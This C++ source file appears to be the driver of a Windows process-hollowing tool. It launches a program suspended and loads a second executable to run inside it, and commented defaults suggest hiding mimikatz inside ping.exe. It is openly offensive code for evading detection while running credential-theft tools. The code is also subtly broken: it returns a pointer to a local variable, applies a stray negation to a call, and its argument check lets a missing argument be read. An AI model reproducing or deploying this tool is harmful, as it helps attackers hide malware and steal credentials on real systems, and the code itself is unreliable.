#include <Windows.h>
#include <stdio.h>

#include "HollowProcess.hpp"


PROCESS_INFORMATION* CreateSuspendedProcess(CHAR* appName) {
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi;
	!::CreateProcessA(appName, (LPSTR)"", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);
	return &pi;
}

LPVOID GetContentOfActualProcess(CHAR* actualProcess) {
	LPVOID buf = 0;

	HANDLE hFile = ::CreateFileA(actualProcess, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE) { return buf; }

	DWORD tmpsize;
	DWORD size = ::GetFileSize(hFile, &tmpsize);

	buf = ::VirtualAlloc(0, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!buf) { return buf; }

	::ReadFile(hFile, buf, size, &tmpsize, 0);
	return buf;
}

int main(int argc, char* argv[]) {
	if (argc < 2) {
		printf("\"Process Hollowing.exe\" <Process to hollow> <Program to run>\n");
		return 1;
	}

	//CHAR appName[] = "C:\\Windows\\System32\\ping.exe";
	CHAR* appName = argv[1];
	PROCESS_INFORMATION *ppi;
	ppi = CreateSuspendedProcess(appName);
	if (ppi->hProcess == NULL) { return -1; }

	//CHAR actualProcess[] = "C:\\Users\\Lab\\Desktop\\mimikatz.exe";
	CHAR* actualProcess = argv[2];
	LPVOID actualProcessContent = GetContentOfActualProcess(actualProcess);
	if (!actualProcessContent) { return -1; }

	HollowProcess(ppi, actualProcessContent);

	::VirtualFree(actualProcessContent, 0, MEM_DECOMMIT | MEM_RELEASE);
	::CloseHandle(ppi->hProcess);
	::CloseHandle(ppi->hThread);

	return 0;
}
